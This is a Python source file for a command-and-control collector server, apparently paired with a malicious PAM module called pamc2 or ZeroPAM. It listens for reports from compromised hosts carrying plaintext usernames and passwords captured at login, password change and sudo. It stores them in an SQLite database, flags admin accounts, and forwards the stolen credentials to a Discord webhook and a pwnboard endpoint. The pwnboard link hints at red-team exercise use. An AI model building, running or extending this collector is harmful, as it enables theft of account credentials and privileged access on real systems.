import os
import socket
import sqlite3
import argparse
import requests
import threading
from dotenv import load_dotenv

# Maximum concurrent client handlers to prevent file-descriptor exhaustion
MAX_CONCURRENT_CLIENTS = int(os.getenv("MAX_CONNS", "200"))

def server_args(cmd_str):
    parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
                        type=int, dest="port", action="store", default="5000")
    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
    parser.add_argument('--pwnboard', dest="pwnboard", action="store_true", help="Send Keep Alive messages to pwnboard")
    parser.add_argument('--pwnboard-host', metavar="<PWNBOARD WEBSITE>", help="Used with --pwnboard; Pwnboard website to send POST requests to (default localhost:8080)", 
                        type=str, dest="pwnhost", action="store", default="localhost:8080")
    return parser.parse_args() if not cmd_str else parser.parse_args(cmd_str.split())

def send_pwnboard(addr, data, pwnhost):
    ip = data.split("-")[0].strip()
    host = f"{pwnhost}/creds"
    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    pwn_data = {"ip": ip, "username": username, "password": password}

    try:
        response = requests.post(host, json=pwn_data, timeout=3)
        return True
    except Exception as E:
        print(E)
        return False

def send_discord(addr, data):
    ip = data.split("-")[0].strip()
    message = data.split("-")[1].split(":")[0].strip()

    if (message == "KEEP ALIVE"):
        return 0
    
    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    fields = []
    color = 0
    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        fields.append({
            'name': "Username",
            'value': f"{username}",
            'inline': True
        })
        fields.append({
            'name': "Password",
            'value': f"{password}",
            'inline': True
        })
    elif (message == "SUDO SESSION OPENED"):
        fields.append({
            'name': "ADMIN USER",
            'value': f"{username}"
        })

    if (message == "SUDO SESSION OPENED"):
        color = 0x07fc03
    elif (message == "USER CHANGED PASSWORD"):
        color = 0x1780e8
    elif (message == "USER AUTHENTICATED"):
        color = 0xf5f50a

    hook_data = {
        'content': data,
        'username': 'ZeroPAM Bot',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
        'embeds': [{
            'description': f"**CREDS UPDATED FROM {ip}**",
            'fields': fields,
            'color': color
        }]
    }

    try:
        # Add a timeout so threads don't hang forever on outbound HTTP
        requests.post(os.getenv('WEBHOOK_URL'), json=hook_data, timeout=5)
    except Exception as e:
        # Log and continue; do not let this leak sockets or threads
        print(f"Discord webhook error: {e}")

def write_db(addr, data):
    conn = sqlite3.connect('logins.db')
    cursor = conn.cursor()

    ip = data.split("-")[0].strip()
    message = data.split("-")[1].split(":")[0].strip()

    if (message == "KEEP ALIVE"):
        return 0

    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        message_type = 1
    elif (message == "SUDO SESSION OPENED"):
        message_type = 2
    else:
        message_type = -1

    cursor.execute(f'''
    CREATE TABLE IF NOT EXISTS passwords(
        ip TEXT NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        known_admin INTEGER DEFAULT 0,
        PRIMARY KEY (ip, username)
    ); ''')

    # Use parameterized queries to avoid SQL injection and ensure correctness
    user_in_table = conn.execute(
        'SELECT password, known_admin FROM passwords WHERE username = ? AND ip = ?;',
        (username, ip)
    )

    userexists = [x for x in user_in_table]

    retval = 0
    if (message_type == 1): # authenticated/chpasswd
        
        if (len(userexists) == 0):
            cursor.execute(
                'INSERT INTO passwords(ip, username, password) VALUES (?, ?, ?);',
                (ip, username, password)
            )
            retval = 1

        elif (userexists[0][0] != password):
            print(f"Updating password for user {username}...")
            cursor.execute(
                'UPDATE passwords SET password = ? WHERE username = ? AND ip = ?;',
                (password, username, ip)
            )
            retval = 1

        elif (userexists[0][0] == password):
            retval = 0

        else:
            print("unknown error adding authenticated user to database")
            retval = -1
    
    elif (message_type == 2): # sudo

        if (len(userexists) != 0):
            if (userexists[0][1] != 1):
                cursor.execute(
                    'UPDATE passwords SET known_admin = 1 WHERE username = ? AND ip = ?;',
                    (username, ip)
                )
                retval = 1
        else:
            print("Got root without authenticating")
            retval = -1

    else:
        print("Unknown Error adding user to database")
        retval = -1

    conn.commit()
    conn.close()

    return retval

def handle_client(lock, c, addr, cmd_args, sem: threading.BoundedSemaphore):
    # Ensure per-connection resources are released even on exceptions
    try:
        # Avoid hanging forever on slow or non-speaking clients
        c.settimeout(10)
        raw_data = c.recv(1024)
        try:
            data = raw_data.decode()
        except UnicodeDecodeError:
            print("Unicode Decode Error: ")
            print(f"Raw Data: {raw_data}")
            return

        if (not cmd_args.onlynew):
            # Printing can be interleaved; guard with lock for readability
            with lock:
                print(f"Received from {addr} - {data}")

        retval = 0
        if (not cmd_args.nodb):
            # Only guard DB writes with the lock
            with lock:
                retval = write_db(addr, data)
        
        if (cmd_args.onlynew and retval == 1):
            with lock:
                print(f"Received from {addr} - {data}")

        # Perform network calls outside of the lock
        if (cmd_args.discord and (not cmd_args.onlynew or retval == 1)):
            send_discord(addr, data)

        if (cmd_args.pwnboard and cmd_args.onlynew):
            send_pwnboard(addr, data, cmd_args.pwnhost)
    except socket.timeout:
        # Client was idle; drop connection
        pass
    except Exception as e:
        print(f"Error handling client {addr}: {e}")
    finally:
        try:
            c.close()
        except Exception:
            pass
        # Release concurrency slot
        try:
            sem.release()
        except Exception:
            pass

def start_server(cmd_args, stop_event=None):
    server_socket = socket.socket()
    # Allow quick restart and avoid TIME_WAIT issues
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("Created socket")

    server_socket.bind(('', cmd_args.port))
    server_socket.listen(256)
    # If we have a stop_event, don't block forever on accept
    if stop_event is not None:
        server_socket.settimeout(1.0)
    print(f"Server listening for incoming connections on port {cmd_args.port}...")

    lock = threading.Lock()
    # Limit concurrent client handlers to prevent FD exhaustion
    sem = threading.BoundedSemaphore(MAX_CONCURRENT_CLIENTS)

    try:
        if (not stop_event):
            while True:
                sem.acquire()
                client_socket, addr = server_socket.accept()
                client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args,sem), daemon=True)
                client_thread.start()
        else:
            while (not stop_event.is_set()):
                try:
                    sem.acquire()
                    client_socket, addr = server_socket.accept()
                except socket.timeout:
                    # Periodically check stop_event
                    sem.release()
                    continue
                client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args,sem), daemon=True)
                client_thread.start()
    finally:
        try:
            server_socket.close()
        except Exception:
            pass

def setup(cmd_args=None, stop_event=None):
    load_dotenv()

    if(type(cmd_args) == str):
        cmd_args = server_args(cmd_args)

    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
        print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
        return False

    if (cmd_args.nodb and cmd_args.onlynew):
        print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
        return False

    start_server(cmd_args, stop_event)

if (__name__ == '__main__'):
    if(not setup()):
        exit(1)